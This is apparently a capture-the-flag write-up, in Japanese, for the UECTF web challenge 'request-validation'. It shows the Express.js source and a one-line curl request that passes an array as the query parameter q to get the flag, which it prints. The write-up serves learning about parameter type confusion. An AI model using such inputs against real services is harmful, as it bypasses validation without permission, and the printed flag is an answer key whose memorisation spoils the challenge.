# request-validation:WEB:323pts
GET リクエストでオブジェクトを送ることはできますか？ ※ まずは、自分の環境でフラグ取得を確認してください。  
Can you request a object?  
- First, please check the flag acquisition in your environment.  

[http://uectf.uec.tokyo:4446](http://uectf.uec.tokyo:4446/)  

[request-validation.tar.gz](request-validation.tar.gz)  

# Solution
URLとソースが配布される。  
ソースは以下のようであった。  
```js
require('dotenv').config();
const express = require('express')
const app = express()
const PORT = process.env.PORT || 8080;

app.listen(PORT, () => {
  console.log(`Example app listening on port ${PORT}`)
})

const FLAG = process.env.FLAG || 'flag{dummy_flag}'

app.get('/', (req, res) => {
  if (req.query.q && typeof req.query.q === 'object') {
    res.send(FLAG)
  } else {
    res.send('invalid request')
  }
})
```
クエリパラメータ`q`が`object`であればよい。  
以下のように配列を投げてやる。  
```bash
$ curl http://uectf.uec.tokyo:4446/?q[]=1
UECTF{javascript_is_difficult_dee36611556508c702805b45289d0f65}
```
flagが得られた。  

## UECTF{javascript_is_difficult_dee36611556508c702805b45289d0f65}